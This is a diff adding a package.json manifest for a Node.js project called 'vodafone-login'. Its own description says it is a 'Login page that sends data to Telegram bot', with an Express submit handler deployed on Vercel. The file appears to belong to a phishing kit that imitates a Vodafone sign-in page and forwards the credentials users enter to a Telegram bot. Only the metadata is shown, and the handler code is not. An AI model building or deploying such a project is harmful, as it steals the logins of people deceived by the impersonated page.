@@ -1,0 +1,20 @@
+{
+  "name": "vodafone-login",
+  "version": "1.0.0",
+  "description": "Login page that sends data to Telegram bot.",
+  "main": "api/submit.js",
+  "scripts": {
+    "start": "node api/submit.js",
+    "dev": "nodemon api/submit.js"
+  },
+  "dependencies": {
+    "axios": "^1.6.7",
+    "express": "^4.18.2"
+  },
+  "engines": {
+    "node": ">=16.0.0"
+  },
+  "vercel": {
+    "framework": "@vercel/node"
+  }
+}
